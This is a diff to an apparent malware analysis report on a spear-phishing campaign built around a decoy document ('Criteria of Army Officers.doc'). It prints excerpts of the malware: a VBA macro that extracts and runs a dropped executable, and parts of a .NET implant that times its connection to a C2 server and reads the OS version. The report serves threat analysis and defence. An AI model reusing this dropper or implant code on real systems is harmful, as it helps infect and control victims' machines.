@@ -13,7 +13,7 @@
   + [Ressources](#Ressources)
 
 <h2>Malware analysis <a name="Malware-analysis"></a></h2>
-<h6>The initial vector is a maldoc called ```"Criteria of Army Officers.doc" ```, this use a macro for extract and execute the PE file depends on the version of the operating system </h6>
+<h6> The initial vector is from a decoy document probably shared from a spear-phishing, this document have two links for download additionnal informations. The both maldoc , this use a macro for extract and execute the PE file depends on the version of the operating system.</h6>
 
 ```vb
 Sub unMoferzip(Fname As Variant, FileNameFolder As Variant)
@@ -23,6 +23,7 @@ Sub unMoferzip(Fname As Variant, FileNameFolder As Variant)
  Set oApp = CreateObject("Shell.Application")
  oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items, &H4
 End Sub
+
 Sub MoferfileLdr()
  Dim path_Mofer_file As String
  Dim file_Mofer_name  As String
@@ -58,6 +59,41 @@ Sub MoferfileLdr()
    Shell path_Mofer_file, vbNormalNoFocus
 End Sub
 ```
+
+<h6>The .NET implant begin to load the recon actions, push a timer for sleep the process and try to join the C2. </h6>
+
+```csharp
+public void ulhtagniasdo_start()
+{
+ ulhtagniasCONF.ulhtagniasport = ulhtagniasCONF.ports[0];
+ this.ulhtagniasrunTime = DateTime.Now;
+ this.ulhtagniasUPC = new ulhtagniasMYINF();
+ this.ulhtagniasCMD = new ulhtagniasOCMD(this);
+ this.ulhtagniasHD.iserver = this;
+ this.ulhtagniasHD.ulhtagniasmainPath = ulhtagniasCONF.ulhtagniasget_mpath();
+ TimerCallback callback = new TimerCallback(this.ulhtagniaslookup_connect);
+ System.Threading.Timer ulhtagniastimer = new System.Threading.Timer(callback, this.ulhtagniasStateObj, 32110, 36110);
+ this.ulhtagniasStateObj.ulhtagniastimer = ulhtagniastimer;
+}
+```
+
+<h6>Can read the Operation System </h6>
+
+```csharp
+public static string ulhtagniasOsname()
+{
+ string result;
+ try
+ {
+  OperatingSystem osversion = Environment.OSVersion;
+  result = osversion.Version.Major.ToString() + ">" + osversion.Version.Minor.ToString();
+ }
+ catch
+ {result = "6>1!ulhtagnias".Split(new char[]{'!'})[0];}
+ return result;
+}
+```
+<h6></h6>
 
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
 <h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
@@ -97,6 +133,8 @@ End Sub
 
 <h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
 
+* [Special Benefits.docx](https://app.any.run/tasks/37407c30-de54-423f-a468-5981c50ced6f)
+* [7All Selected list.xls](https://app.any.run/tasks/db365b0c-883e-410c-975d-d14753a5bfb4)
 * [Criteria of Army Officers.doc](https://app.any.run/tasks/de93d3a4-9ff0-4bed-b492-1f45214a0443)
 
 <h6> Resources : </h6><a name="Ressources"></a>
